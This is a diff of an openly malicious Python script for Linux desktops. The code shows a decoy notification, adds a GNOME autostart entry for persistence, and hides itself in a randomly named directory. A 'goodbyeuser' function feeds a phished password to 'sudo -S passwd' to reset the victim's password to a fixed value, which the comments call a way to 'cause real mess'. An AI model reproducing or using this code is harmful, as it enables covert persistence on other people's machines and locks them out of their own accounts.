@@ -26,6 +26,24 @@ def dirgenerator():
     
     chars = "4BCD3F9H1JKLMN0PQR5TUVWXYZbcdfhjklmnpqrtuvwxyz"
     dirs = []
+    ######## ------- ########
+    # Another wat to find   #
+    # directory list inside #
+    #       Home            #
+    ######## ------- ########
+
+    # for i in paths:
+    #     if pathlib.Path(i).is_dir()==True:
+    #         print("foldrer:",i)
+    #         continue
+
+    #     elif (pathlib.Path(i).is_dir() == False) or (pathlib.Path(i).is_file() == True):
+    #         print(os.path.isdir(i))
+    #         try:
+    #             print("removing",i)
+    #             paths.remove(i)
+    #         except ValueError:
+    #             continue
 
     #To get the directory names. This is to show that we can get directory also in this way.
 
@@ -79,24 +97,36 @@ def dirgenerator():
 
 
 
+
+
+
+
+#With This Function We can change the password
+#This Usually Changes the password to d4redevil
+#This can only work if the password is phished and the Phished Password is a correct password.
+
 ######## ------- ########
-# Another wat to find   #
-# directory list inside #
-#       Home            #
+#   Idea to Cause real  #
+#        Mess           #
 ######## ------- ########
 
-   # for i in paths:
-    #     if pathlib.Path(i).is_dir()==True:
-    #         print("foldrer:",i)
-    #         continue
+#Consider A really random generated password.
 
-    #     elif (pathlib.Path(i).is_dir() == False) or (pathlib.Path(i).is_file() == True):
-    #         print(os.path.isdir(i))
-    #         try:
-    #             print("removing",i)
-    #             paths.remove(i)
-    #         except ValueError:
-    #             continue
+#### ---- Solution ---- ####
+
+#You can change the Password of any user when you are in root user.
+
+def goodbyeuser(password):
+    get_fucked=subprocess.Popen(f"sudo -S passwd {getpass.getuser()}",shell=True, stdin=subprocess.PIPE)    # Creating a subprocess and piping standard input to communicate with it.
+    get_fucked.stdin.write(f'{password}\n'.encode())    # Writing encoded current password (Bytes) to the stdin. \n in the end is to indicate return (ENTER). 
+    get_fucked.stdin.write('d4redevil\n'.encode())  # Writing encoded New password (Bytes) to the stdin. \n in the end is to indicate return (ENTER).
+    get_fucked.stdin.write('d4redevil\n'.encode())  # Writing encoded New password (Bytes) again to the stdin. \n in the end is to indicate return (ENTER).
+    get_fucked.stdin.flush() #Flushing the stdin
+    time.sleep(1)
+    get_fucked.terminate()
+    get_fucked.kill()
+    quit()
+
 
 
 
@@ -110,10 +140,10 @@ except IndexError:
 #if No parameter is given. Then it will infect the system.
 if Attack == None:
     #Just to make the script to dont look suspicious while execution
-    
+
     message = input("Notification Message: ")
     os.system(f"notify-send {message}")
-    
+
     #getting location to hide the script
     newfileloc = dirgenerator()
 
@@ -121,7 +151,7 @@ if Attack == None:
     os.system("touch /home/{}/.config/autostart/gnome-terminal.desktop".
               format(getpass.getuser()))
 
-    
+
     #Add our Script to the autostart Programms.
     with open("/home/{}/.config/autostart/gnome-terminal.desktop".format(getpass.getuser()), "w") as _:
         _.write(
@@ -129,14 +159,6 @@ if Attack == None:
     
     #To hide our script, We are moving our sctipt to new location.
     os.system(f"mv '{__file__}' '{newfileloc}'")
-
-def goodbyeuser(password):
-    get_fucked=subprocess.Popen(f"sudo -S passwd {getpass.getuser()}",shell=True, stdin=subprocess.PIPE)
-    get_fucked.stdin.write(f'{password}\n'.encode())
-    get_fucked.stdin.write('d4redevil\n'.encode())
-    get_fucked.stdin.write('d4redevil\n'.encode())
-    get_fucked.stdin.flush()
-    quit()
 
 
 #If R is specified as a argument we can start the attack
